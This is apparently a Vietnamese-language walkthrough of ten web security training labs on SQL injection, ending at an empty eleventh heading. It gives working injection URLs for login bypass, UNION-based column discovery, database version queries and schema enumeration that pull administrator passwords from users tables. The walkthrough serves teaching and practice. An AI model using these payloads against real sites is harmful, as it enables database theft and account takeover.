# 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Truy cập category 'Pets' ta thấy URL có dạng `/filter?category=Pets`

Test lỗi SQL injection: `/filter?category=Pets'--`. Kết quả trả về thành công, như vậy trang web có lỗ hổng SQLi ở chức năng search theo category

Để show thông tin tất cả các category, ta thay đổi URL thành `filder?category=Pets'+or+'1'='1`. Kết quả trả về thành công.

# 2. SQL injection vulnerability allowing login bypass
Thử dùng username `administrator'--` để đăng nhập. Nếu có lỗi SQL injection, câu query sinh ra sẽ bỏ qua việc xác thực password. 

Sau khi submit, ta thu được kết quả thành công.

# 3. SQL injection UNION attack, determining the number of columns returned by the query
Trong chức năng tìm kiếm theo category của website, URL có dạng `/filter?category=Gifts`

Ta thay đổi URL thành `/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL` thì thấy kết quả trả về thành công. Như vậy có 3 cột được trả về trong câu truy vấn (tương ứng với 3 giá trị NULL)

# 4. SQL injection UNION attack, finding a column containing text
Trong chức năng tìm kiếm theo category của website, URL có dạng `/filter?category=Lifestyle`

Ta thay đổi URL thành `/filter?category=Lifestyle%20UNION%20SELECT%20NULL,NULL,NULL--` thì thấy kết quả trả về thành công. Như vậy có 3 cột được trả về từ câu truy vấn. Tiếp theo, ta cần tìm column chứa kiểu dữ liệu string.

Thay lần lượt từng giá trị NULL thành `%27a%27`, ta thấy với URL `filter?category=Lifestyle%27%20UNION%20SELECT%20NULL,%27a%27,NULL--` thì không bị lỗi "Internal Server Error". Như vậy column thứ 2 chính là column ta cần tìm.

# 5. SQL injection UNION attack, retrieving data from other tables
Chức năng search theo category của website có lỗi SQLi. 

Ta thay URL thành `/filter?category=Accessories%27%20UNION%20SELECT%20NULL,NULL%20FROM%20users--`. Kêt quả thành công, như vậy có 2 column được trả về

Thay URL thành `/filter?category=Accessories%27%20UNION%20SELECT%20%27a%27,%27a%27%20FROM%20users--`. Kết quả thành công, như vậy cả hai column đó đều có kiểu dữ liệu string.

Thay URL thành `/filter?category=Accessories%27%20UNION%20SELECT%20username,password%20FROM%20users--` thì thấy username và password của administrator đã xuất hiện như trong hình

![image](https://user-images.githubusercontent.com/103978452/201867157-34622c44-2e40-4672-86bd-a0f9211f0010.png)

Dùng thông tin đã có để đăng nhập, kết quả thành công.

# 6. SQL injection UNION attack, retrieving multiple values in a single column
Chức năng search theo category của website có lỗi SQLi.

Ta thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,%27a%27--`. Kết quả trả về không có lỗi, như vậy câu query có 2 column được trả về.

Thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,%27a%27--`, kết quả trả về không có lỗi. Trong khi đó, nếu cũng thay giá trị NULL còn lại thành `%27a%27` thì lại xuất hiện lỗi. Như vậy chỉ có column thứ 2 có kiểu dữ liệu string.

Để lấy username, ta thay đổi URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,username%20FROM%20users--`. 

![image](https://user-images.githubusercontent.com/103978452/201869031-2f95a213-131d-4c13-abb8-068e8bada6c4.png)

Để lấy password, ta thay URL thành `/filter?category=Pets%27%20UNION%20SELECT%20NULL,password%20FROM%20users--`. Password ở vị trí tương ứng với username=administrator (vị trí thứ hai) chính là password ta cần tìm.

![image](https://user-images.githubusercontent.com/103978452/201869200-46e69891-1d51-413c-be36-36c145b9e45f.png)

Sử dụng username và password thu được để đăng nhập, kết quả thành công.

# 7. SQL injection attack, querying the database type and version on Oracle
Chức năng search theo category của website có lỗi SQLi.

Ta thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL%20from%20dual--` thì thấy không có thông báo lỗi. Như vậy query trả về 2 column.

Ta thấy khi thay giá trị `NULL` thứ 2 thành `%27a%27` thì không có lỗi. Như vậy tại column thứ 2 có kiểu dữ liệu string.

Để lấy version của Oracle, ta thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,banner%20from%20v$version--`. Kết quả trả về thành công.

![image](https://user-images.githubusercontent.com/103978452/201870472-ba3cc893-04bb-4d21-8835-931e3c83c252.png)

# 8. SQL injection attack, querying the database type and version on MySQL and Microsoft
Chức năng search theo category của website có lỗi SQLi. Khi thay URL thành `/filter?category=Gifts%27--` thì kết quả trả về lỗi. Nhưng dùng URL `/filter?category=Gifts%27%23` thì lại thành công. Như vậy database được sử dụng là MySQL.

Thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,NULL%23` thì kết quả không có lỗi, như vậy query trả về 2 column.

Thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,%27a%27%23` thì kết quả không có lỗi, như vậy column thứ hai có kiểu dữ liệu string.

Thay URL thành `/filter?category=Gifts%27%20UNION%20SELECT%20NULL,@@version%23`, ta thu được thông tin version của database.

![image](https://user-images.githubusercontent.com/103978452/201872385-d99883a4-4dbd-4edf-b54c-e9579ecec1ec.png)

# 9. SQL injection attack, listing the database contents on non-Oracle databases
Chức năng search theo category của website có lỗi SQLi. Khi thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20%27a%27,%27a%27--` thì kết quả trả về không có lỗi. Như vậy câu query trả về 2 column và cả hai đều có kiểu dữ liệu string.

Để lấy tên table chứa thông tin login, ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20table_type,table_name%20FROM%20information_schema.tables--`. Tìm kiếm trong các kết quả trả về, ta thấy có một table có tên là "users_vtwdxr" có thể là table chứa thông tin đăng nhập mà ta cần tìm:

![image](https://user-images.githubusercontent.com/103978452/201873823-b304e25c-3057-41c4-ad40-919f88a54137.png)

Để lấy các trường có trong table đó, ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20column_name,data_type%20FROM%20information_schema.columns%20where%20table_name=%27users_vtwdxr%27--`. Trong các kết quả trả về ta thấy hai trường đáng chú ý là "username_jfwaxj" và "password_wvyxlu".

![image](https://user-images.githubusercontent.com/103978452/201874596-aac50c94-7456-49a9-8896-cddb5f4a5440.png)

Liệt kê các giá trị của hai trường này trong table "users_vtwdxr" bằng cách thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20username_jfwaxj,password_wvyxlu%20FROM%20users_vtwdxr--`. Username và password của administrator đã xuất hiện:

![image](https://user-images.githubusercontent.com/103978452/201874561-2bf063bf-ce79-4d7e-b596-d363a5cc8365.png)

Sử dụng thông tin đã có để đăng nhập, thu được kết quả thành công.

# 10. SQL injection attack, listing the database contents on Oracle
Chức năng search theo category của website có lỗi SQLi, database sử dụng là Oracle. Khi ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20%27a%27,%27a%27%20FROM%20dual--` thì kết quả thành công. Như vậy câu query trả về 2 columns và cả hai đều có kiểu dữ liệu string.

Để xem danh sách các tables, ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20table_name,NULL%20FROM%20all_tables--`. Trong số kết quả có được, có table "USERS_HJWWRD" có khả năng là table chứa thông tin đăng nhập của users.

![image](https://user-images.githubusercontent.com/103978452/201877077-2d994530-6a2f-4869-a719-2a04b239a683.png)

Để xem danh sách các trường trong table "USERS_HJWWRD", ta thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20column_name,data_type%20FROM%20all_tab_columns%20where%20table_name=%27USERS_HJWWRD%27--`. Ta chú ý đến hai trường "USERNAME_SAMKHP" và "PASSWORD_TOTGCL".

![image](https://user-images.githubusercontent.com/103978452/201877349-69289e28-854a-4449-b6c8-57c8430bff08.png)

SELECT tất cả các giá trị trong hai columns "USERNAME_SAMKHP" và "PASSWORD_TOTGCL" bằng cách thay URL thành `/filter?category=Lifestyle%27%20UNION%20SELECT%20USERNAME_SAMKHP,PASSWORD_TOTGCL%20FROM%20USERS_HJWWRD--`, ta thu được username và password của administrator.

![image](https://user-images.githubusercontent.com/103978452/201877501-415166ea-7846-4938-9147-3f19be65075f.png)

Sử dụng thông tin đã có để đăng nhập, kết quả thành công.

# 11. Blind SQL injection with conditional responses
